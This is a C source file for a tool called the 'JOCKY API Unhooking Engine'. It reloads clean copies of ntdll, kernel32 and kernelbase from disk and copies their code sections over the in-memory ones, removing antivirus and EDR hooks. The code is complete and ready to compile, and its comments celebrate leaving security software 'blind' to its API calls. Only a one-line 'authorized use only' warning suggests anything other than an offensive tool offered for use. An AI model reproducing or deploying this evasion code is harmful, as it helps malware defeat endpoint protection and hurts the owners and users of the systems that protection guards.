/*
 * api_unhook.c — JOCKY API Unhooking Engine
 * ─────────────────────────────────────────
 * Removes AV/EDR hooks from ntdll.dll's .text section by
 * reloading a clean copy from disk and overwriting the hooked in-memory copy.
 *
 * How AV hooks work:
 *   1. AV/EDR starts → injects itself into every process
 *   2. It patches the first bytes of key ntdll functions
 *      (e.g. NtAllocateVirtualMemory, NtWriteVirtualMemory)
 *   3. Patched bytes → JMP to AV's own monitoring code
 *   4. AV sees every API call → can block/alert suspicious ones
 *
 * How we defeat it:
 *   - ntdll.dll on DISK is always clean (AV only patches the in-memory copy)
 *   - We mmap the on-disk ntdll.dll into our own address space
 *   - We copy its clean .text section over the hooked in-memory .text section
 *   - All AV JMP patches are now overwritten with the original syscall stubs
 *   - AV is now deaf — it cannot monitor our API calls
 *
 * Compile:
 *   cl /nologo /O2 /W3 api_unhook.c /link /out:unhook.exe
 *   gcc -O2 -o unhook api_unhook.c
 *
 * WARNING: For authorized forensic/research use only.
 */

#ifndef __USE_MINGW_ANSI_STDIO
#define __USE_MINGW_ANSI_STDIO 1
#endif
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

/* ── Unhook a single DLL ──────────────────────────────────────────────────── */

/**
 * unhook_dll()
 *
 * @param dll_name   Name of the DLL to unhook (e.g. "ntdll.dll")
 * @return           0 on success, -1 on failure
 *
 * Steps:
 *  1. Locate DLL on disk  (GetSystemDirectory + dll_name)
 *  2. Map it into our process as IMAGE (not data)
 *  3. Find the in-memory (hooked) copy via GetModuleHandle
 *  4. Locate .text section in both copies
 *  5. VirtualProtect hooked copy → writable
 *  6. memcpy clean .text over hooked .text
 *  7. Restore original memory protection
 */
int unhook_dll(const char *dll_name)
{
    char dll_path[MAX_PATH];
    HANDLE h_file  = INVALID_HANDLE_VALUE;
    HANDLE h_map   = NULL;
    LPVOID p_fresh = NULL;
    int    result  = -1;

    /* ── 1. Build full path to DLL on disk ────────────────────────────── */
    char sysdir[MAX_PATH];
    GetSystemDirectoryA(sysdir, MAX_PATH);
    snprintf(dll_path, sizeof(dll_path), "%s\\%s", sysdir, dll_name);

    printf("[JOCKY Unhook] Target DLL : %s\n", dll_path);

    /* ── 2. Open DLL file ────────────────────────────────────────────── */
    h_file = CreateFileA(
        dll_path,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (h_file == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[JOCKY Unhook] CreateFile failed: %lu\n",
                GetLastError());
        goto cleanup;
    }

    /* ── 3. Create file mapping as IMAGE ─────────────────────────────── */
    /*
     * SEC_IMAGE tells Windows to interpret the file as a PE image,
     * relocating it properly — giving us the exact same layout as
     * it would have when loaded, but WITHOUT the AV hooks.
     */
    h_map = CreateFileMappingA(
        h_file,
        NULL,
        PAGE_READONLY | SEC_IMAGE,
        0, 0,
        NULL);

    if (!h_map) {
        fprintf(stderr, "[JOCKY Unhook] CreateFileMapping failed: %lu\n",
                GetLastError());
        goto cleanup;
    }

    p_fresh = MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0);
    if (!p_fresh) {
        fprintf(stderr, "[JOCKY Unhook] MapViewOfFile failed: %lu\n",
                GetLastError());
        goto cleanup;
    }
    printf("[JOCKY Unhook] Loaded CLEAN copy from disk at 0x%p\n", p_fresh);

    /* ── 4. Get in-memory (hooked) copy ──────────────────────────────── */
    LPVOID p_hooked = GetModuleHandleA(dll_name);
    if (!p_hooked) {
        fprintf(stderr, "[JOCKY Unhook] GetModuleHandle failed for %s\n",
                dll_name);
        goto cleanup;
    }
    printf("[JOCKY Unhook] Hooked in-memory copy at 0x%p\n", p_hooked);

    /* ── 5. Parse PE headers to find .text section ───────────────────── */
    PIMAGE_DOS_HEADER  dos_fresh = (PIMAGE_DOS_HEADER)p_fresh;
    PIMAGE_NT_HEADERS  nt_fresh  = (PIMAGE_NT_HEADERS)(
        (BYTE*)p_fresh + dos_fresh->e_lfanew);
    PIMAGE_SECTION_HEADER sec    = IMAGE_FIRST_SECTION(nt_fresh);

    DWORD num_sections = nt_fresh->FileHeader.NumberOfSections;
    printf("[JOCKY Unhook] Scanning %lu PE sections...\n", num_sections);

    for (DWORD i = 0; i < num_sections; i++, sec++) {
        /* We target .text (code) — that's where all hooks live */
        if (strncmp((char*)sec->Name, ".text", 5) == 0 ||
            strncmp((char*)sec->Name, "CODE",  4) == 0)
        {
            printf("[JOCKY Unhook] Found code section: %-8s "
                   "(VirtualAddress=0x%08lX, Size=%lu bytes)\n",
                   sec->Name,
                   sec->VirtualAddress,
                   sec->Misc.VirtualSize);

            BYTE *hooked_text = (BYTE*)p_hooked + sec->VirtualAddress;
            BYTE *fresh_text  = (BYTE*)p_fresh  + sec->VirtualAddress;
            DWORD section_sz  = sec->Misc.VirtualSize;

            /* ── 6. Make hooked section writable ─────────────────────── */
            DWORD old_protect = 0;
            if (!VirtualProtect(
                    hooked_text, section_sz,
                    PAGE_EXECUTE_READWRITE,
                    &old_protect))
            {
                fprintf(stderr,
                        "[JOCKY Unhook] VirtualProtect (RWX) failed: %lu\n",
                        GetLastError());
                goto cleanup;
            }

            /* ── 7. Overwrite hooked code with clean code ─────────────── */
            /*
             * This single memcpy removes EVERY AV/EDR hook in this section.
             * After this, AV's monitoring JMPs are gone — replaced with the
             * original Windows syscall stubs that talk directly to the kernel.
             */
            memcpy(hooked_text, fresh_text, section_sz);

            /* ── 8. Restore original protection ─────────────────────── */
            DWORD dummy;
            VirtualProtect(
                hooked_text, section_sz,
                old_protect,
                &dummy);

            printf("[JOCKY Unhook] ✓ %s section restored — "
                   "all AV hooks removed!\n", sec->Name);
            result = 0;
            break;
        }
    }

    if (result != 0) {
        fprintf(stderr, "[JOCKY Unhook] .text section not found in %s\n",
                dll_name);
    }

cleanup:
    if (p_fresh) UnmapViewOfFile(p_fresh);
    if (h_map)   CloseHandle(h_map);
    if (h_file != INVALID_HANDLE_VALUE) CloseHandle(h_file);
    return result;
}


/* ── Unhook all common AV targets ───────────────────────────────────────── */

void unhook_all(void)
{
    /*
     * AV/EDR typically hooks these DLLs:
     *   ntdll.dll   — core NT syscall stubs (most important)
     *   kernel32.dll — Win32 process/thread/memory functions
     *   kernelbase.dll — lower-level Win32 functions
     */
    const char *targets[] = {
        "ntdll.dll",
        "kernel32.dll",
        "kernelbase.dll",
        NULL
    };

    printf("╔══════════════════════════════════════════════╗\n");
    printf("║  JOCKY API Unhooking Engine v1.0             ║\n");
    printf("║  Removing all AV/EDR userland hooks...       ║\n");
    printf("╚══════════════════════════════════════════════╝\n\n");

    int success = 0, failed = 0;
    for (int i = 0; targets[i]; i++) {
        printf("\n[%d/%d] Unhooking: %s\n", i+1, 3, targets[i]);
        if (unhook_dll(targets[i]) == 0)
            success++;
        else
            failed++;
    }

    printf("\n══════════════════════════════════════\n");
    printf("Unhooking complete: %d succeeded, %d failed\n",
           success, failed);
    printf("AV/EDR is now blind to JOCKY API calls. ✓\n");
}


/* ─────────────────────────────────────────────────────────────────────────── */

int main(void)
{
    unhook_all();
    return 0;
}
